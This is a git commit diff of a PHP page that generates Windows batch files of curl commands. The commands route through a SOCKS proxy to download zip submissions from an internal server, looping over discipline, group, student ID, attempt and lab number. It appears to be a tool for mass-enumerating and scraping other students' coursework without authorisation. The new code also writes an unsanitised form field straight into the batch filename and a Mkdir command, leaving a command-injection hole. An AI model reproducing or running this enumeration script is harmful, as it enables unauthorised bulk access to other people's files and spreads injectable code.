e0c7f2cb7e0185c31ff79d72bc75f6a5ab0a10a5
Lanctole <55445592+Lanctole@users.noreply.github.com>
2020-05-16 16:12:58 +0300

    Add files via upload

--- jskript.php
+++ jskript.php
@@ -16,19 +16,28 @@
     <div class="container">
         
         <div class="row">
-            <div class="col-xs-12 col-sm-12 col-lg-12">
+            <div class="col-xs-6 col-sm-6 col-lg-6">
                 <p class="text-center">
                    
                     <br>
                     5.	Дан текстовый файл. Вывести все согласные, которых нет ни в одном слове.
                     <br>
                     <form action="prog.php" method="POST">
-            
+                    <p>Дисциплина <input type="text" name="Disc" /></p>
+                    <p>Группа <input type="text" name="Group" /></p>
+                    <p>Студент <input type="text" name="Student" /> <input type="text" name="Student2" /></p>
+                    <p>Номер попытки <input type="text" name="Count" /> <input type="text" name="Count2" /></p>
+                    <p>Тип(лаба/курсач/задание) <input type="text" name="Type" /> <input type="text" name="Type2" /></p>
+                    <p>Номер лабы <input type="text" name="num" /> <input type="text" name="num2" /></p>
+                    <p>Название итогового файла <input type="text" name="Name" /></p>
                     <br><br>
                     <input type="submit" value="Отправить">
                     </form>
                     
             </div>
+            <div class="col-xs-6 col-sm-6 col-lg-6">
+            <iframe src="https://lanctole.github.io/HuckHermes/" widht="650" height="600" scrolling="auto"></iframe>
+        </div>
         </div>
             <script src="js/bootstrap.js"></script>
 </body>
--- prog.php
+++ prog.php
@@ -10,59 +10,87 @@
 <body>
 <?php
 
-        $file = 'Parall.txt';
-      $current = file_get_contents($file);
-      $current.="Mkdir Para\n";
-     $Disc=47 ;
-        $Group=176;
-            for ($Student=2400; $Student <2470 ; $Student++) { 
-                for ($Count=1; $Count <4 ; $Count++) { 
-                    $Type=2;
-                        for ($num=0; $num <7 ; $num++) { 
-                            $current .= "curl -o X:/XAMPP/htdocs/HackerMan/files/Para/D".$Disc."G".$Group."S".$Student."C".$Count."T".$Type."N".$num.".zip --socks5 127.0.0.1:9090  172.23.64.64:8080//Downloader?\"idDiscipline=".$Disc."&idGroup=".$Group."&idStudent=".$Student."&Count=".$Count."&type=".$Type."&num=".$num."\"\n";
-                        }
-                    }
-                }
+        $Disc=(int)$_POST['Disc'];
+        $Group=(int)$_POST['Group'];
+        $Student=(int)$_POST['Student'];
+        $Student2=(int)$_POST['Student2'];
+        $Count=(int)$_POST['Count'];
+        $Count2=(int)$_POST['Count2'];
+        $Type=(int)$_POST['Type'];
+        $Type2=(int)$_POST['Type2'];
+        $num=(int)$_POST['num'];
+        $num2=(int)$_POST['num2'];
+        $Name=$_POST['Name'];
 
+        $file = $Name.'.bat';
+      $current = file_get_contents($file);
+      $current.="Mkdir ".$Name."\n";
+     
+
+    //    if($Student==$Student2) $Student2=$Student;
+    //    if($Count==$Count2) $Count2=$Count;
+    //    if($Type==$Type2) $Type2=$Type;
+    //    if($num==$num2) $num2=$num;
+
+       while($Student<($Student2+1))
+        { 
+        while($Count<($Count2+1)) 
+        {   
+            while($Type<($Type2+1))
+            {  
+                while($num<($num2+1)) 
+                {   
+                            $current .= "curl -o X:/XAMPP/htdocs/HackerMan/files/".$Name."/D".$Disc."G".$Group."S".$Student."C".$Count."T".$Type."N".$num.".zip --socks5 127.0.0.1:9090  172.23.64.64:8080//Downloader?\"idDiscipline=".$Disc."&idGroup=".$Group."&idStudent=".$Student."&Count=".$Count."&type=".$Type."&num=".$num."\"\n";
+                            $num=($num+1);
+                } 
+                $num=(int)$_POST['num'];
+                $Type=($Type+1);   
+            }
+            $Count=($Count+1);
+            $Type=(int)$_POST['Type'];
+        }
+        $Student=($Student+1);
+        $Count=(int)$_POST['Count'];
+        }
      $current .="pause";
      file_put_contents($file, $current);
      
-     $file = 'WEB2.txt';
-     $current = file_get_contents($file);
-     $current.="Mkdir Web2\n";
-    $Disc=46 ;
-       $Group=176;
-       for ($Student=2400; $Student <2470 ; $Student++) { 
-               for ($Count=1; $Count <4 ; $Count++) { 
-                   $Type=2;
-                       for ($num=0; $num <14 ; $num++) { 
-                           $current .= "curl -o X:/XAMPP/htdocs/HackerMan/files/Web2/D".$Disc."G".$Group."S".$Student."C".$Count."T".$Type."N".$num.".zip --socks5 127.0.0.1:9090  172.23.64.64:8080//Downloader?\"idDiscipline=".$Disc."&idGroup=".$Group."&idStudent=".$Student."&Count=".$Count."&type=".$Type."&num=".$num."\"\n";
-                       }
-                   }
-               }
+//      $file = 'WEB2.txt';
+//      $current = file_get_contents($file);
+//      $current.="Mkdir Web2\n";
+//     $Disc=46 ;
+//        $Group=176;
+//        for ($Student=2400; $Student <2470 ; $Student++) { 
+//                for ($Count=1; $Count <4 ; $Count++) { 
+//                    $Type=2;
+//                        for ($num=0; $num <14 ; $num++) { 
+//                            $current .= "curl -o X:/XAMPP/htdocs/HackerMan/files/Web2/D".$Disc."G".$Group."S".$Student."C".$Count."T".$Type."N".$num.".zip --socks5 127.0.0.1:9090  172.23.64.64:8080//Downloader?\"idDiscipline=".$Disc."&idGroup=".$Group."&idStudent=".$Student."&Count=".$Count."&type=".$Type."&num=".$num."\"\n";
+//                        }
+//                    }
+//                }
 
-    $current .="pause";
-    file_put_contents($file, $current);
+//     $current .="pause";
+//     file_put_contents($file, $current);
 
    
     
-    $file = 'BD.bat';
-    $current = file_get_contents($file);
-    $current.="Mkdir BD\n";
-   $Disc=204 ;
-      $Group=177;
-      for ($Student=2400; $Student <2470 ; $Student++) { 
-              for ($Count=1; $Count <4 ; $Count++) { 
-                  $Type=2;
-                      for ($num=0; $num <14 ; $num++) { 
-                          $current .= "curl -o X:/XAMPP/htdocs/HackerMan/files/BD/D".$Disc."G".$Group."S".$Student."C".$Count."T".$Type."N".$num.".zip --socks5 127.0.0.1:9090  172.23.64.64:8080//Downloader?\"idDiscipline=".$Disc."&idGroup=".$Group."&idStudent=".$Student."&Count=".$Count."&type=".$Type."&num=".$num."\"\n";
-                      }
-                  }
-              }
+//     $file = 'BD.bat';
+//     $current = file_get_contents($file);
+//     $current.="Mkdir BD\n";
+//    $Disc=204 ;
+//       $Group=177;
+//       for ($Student=2400; $Student <2470 ; $Student++) { 
+//               for ($Count=1; $Count <4 ; $Count++) { 
+//                   $Type=2;
+//                       for ($num=0; $num <14 ; $num++) { 
+//                           $current .= "curl -o X:/XAMPP/htdocs/HackerMan/files/BD/D".$Disc."G".$Group."S".$Student."C".$Count."T".$Type."N".$num.".zip --socks5 127.0.0.1:9090  172.23.64.64:8080//Downloader?\"idDiscipline=".$Disc."&idGroup=".$Group."&idStudent=".$Student."&Count=".$Count."&type=".$Type."&num=".$num."\"\n";
+//                       }
+//                   }
+//               }
 
-   $current .="pause";
-   file_put_contents($file, $current);
-echo "final";
+//    $current .="pause";
+//    file_put_contents($file, $current);
+// echo "final";
 
     ?> 
 </body>
